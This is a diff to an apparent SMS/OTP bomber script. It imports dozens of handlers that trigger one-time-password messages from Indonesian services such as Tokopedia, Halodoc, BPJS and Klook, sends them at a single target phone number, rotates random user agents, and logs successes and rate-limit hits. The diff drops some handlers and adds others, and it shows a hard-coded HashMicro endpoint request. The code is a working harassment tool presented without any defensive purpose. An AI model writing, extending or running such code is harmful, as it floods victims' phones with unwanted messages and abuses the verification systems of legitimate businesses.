@@ -16,26 +16,22 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from utils import normalize, fmt_08, get_public_ip, generate_multipart, extract_csrf, get_random_user_agent
 from handlers import (
-    send_tuneup_otp, send_hashmicro_otp, send_internetrakyat_otp,
-    send_ultramilk_register, send_kaniva_otp, send_jembatani_otp,
-    send_rcx_otp, send_sahabatteknisi_otp, send_auto2000_otp,
-    send_astra_daihatsu_otp, send_royal_canin_otp, send_watsons_otp,
-    send_99co_otp, send_belirumah_otp, send_fastwork_otp,
-    send_hrsbre_otp, send_erafone_otp, send_beautyhaul_otp,
-    send_hainaya_otp, send_minumyukkaka_otp, send_sidemang_otp,
-    send_lapormasbup_otp, send_ptsp_kemenag_otp, send_planetban_otp,
-    send_klook_otp,send_duniagames_otp,send_tokopedia_otp,send_mapclub_otp,
+    send_hashmicro_otp, send_internetrakyat_otp,
+    send_ultramilk_register, send_auto2000_otp,
+    send_astra_daihatsu_otp, send_watsons_otp,
+    send_99co_otp, send_fastwork_otp,
+    send_hrsbre_otp, send_erafone_otp,
+    send_duniagames_otp,send_tokopedia_otp,send_mapclub_otp,
     send_cmkclub_otp,send_babyhappy_otp,send_bukuaku_otp,send_generasi_otp,
     send_insureka_otp,send_opaper_otp,send_rappi_otp,send_segari_otp,
     send_toyota_otp,send_garasi_otp,send_jakartanote_otp,send_kitabisa_otp,
-    send_bmsecure_aci_otp,send_akseleran_otp,send_irmastore_otp,
+    send_bmsecure_aci_otp,send_akseleran_otp,
     send_tiptip_otp,send_tokoplas_otp,send_toplusms_otp,send_vidio_otp,send_kpoin_otp,
     send_nusa_otp,send_berprestasi_otp,send_bisatopup_otp,send_stockbit_otp,
-    send_misteraladin_otp,send_redbus_otp,send_buccheri_otp,send_gabino_otp,
+    send_redbus_otp,send_buccheri_otp,send_gabino_otp,
     send_moladin_otp,send_adiraku_otp,send_tri_otp,send_bmsecure_sofia_otp,
     send_alodokter_otp,send_alomedika_otp,send_bpjs_otp,send_halodoc_otp,
-    send_pinhome_otp,send_rumah123_otp,
-    send_easycash_otp,send_kreditpintar_otp,send_skillacademy_otp,
+    send_easycash_otp,send_kreditpintar_otp,send_skillacademy_otp,send_pizzahut_otp
 )
 from targets import TARGETS
 
@@ -81,43 +77,8 @@ def process_target(api, target62, ip, idx, total):
         session.headers.update({'User-Agent': get_random_user_agent()})
 
         post_type = api.get('post_type', '')
-        
-       
-        if post_type == 'planetban':
-            number = api['number_fmt'](target62)
-            resp = send_planetban_otp(number)
-            if resp and resp.status_code in [200, 201]:
-                status_text, detail, success = "SUCCESS", "OTP sent", True
-            elif resp and resp.status_code == 429:
-                status_text, detail = "LIMITED", "Rate limit"
-            log_target(idx, total, name, status_text, detail)
-            return success
 
-        elif post_type == 'tuneup':
-            number = api['number_fmt'](target62)
-            resp = send_tuneup_otp(number)
-            if resp and resp.status_code in [200, 201]:
-                status_text, detail, success = "SUCCESS", "OTP sent", True
-            elif resp and resp.status_code == 429:
-                status_text, detail = "LIMITED", "Rate limit"
-            log_target(idx, total, name, status_text, detail)
-            return success
-
-        elif post_type == 'hashmicro':
-            number = api['number_fmt'](target62)
-            form_data = send_hashmicro_otp(number)
-            if form_data:
-                url = "https://website-api.hashmicro.com/api/add/3"
-                payload = '&'.join([f"{k}={requests.utils.quote(str(v))}" for k, v in form_data.items()])
-                resp = session.post(url, data=payload, timeout=15)
-                if resp.status_code in [200, 201]:
-                    status_text, detail, success = "SUCCESS", "OTP sent", True
-                elif resp.status_code == 429:
-                    status_text, detail = "LIMITED", "Rate limit"
-            log_target(idx, total, name, status_text, detail)
-            return success
-
-        elif post_type == 'internetrakyat':
+        if post_type == 'internetrakyat':
             number = api['number_fmt'](target62)
             resp = send_internetrakyat_otp(number)
             if resp and resp.status_code in [200, 201]:
@@ -127,14 +88,6 @@ def process_target(api, target62, ip, idx, total):
                         status_text, detail, success = "SUCCESS", "OTP sent", True
                 except:
                     status_text, detail, success = "SUCCESS", "OTP sent", True
-            log_target(idx, total, name, status_text, detail)
-            return success
-
-        elif post_type == 'klook':
-            number = api['number_fmt'](target62)
-            resp = send_klook_otp(number)
-            if resp and resp.status_code in [200, 201]:
-                status_text, detail, success = "SUCCESS", "OTP sent", True
             log_target(idx, total, name, status_text, detail)
             return success
 
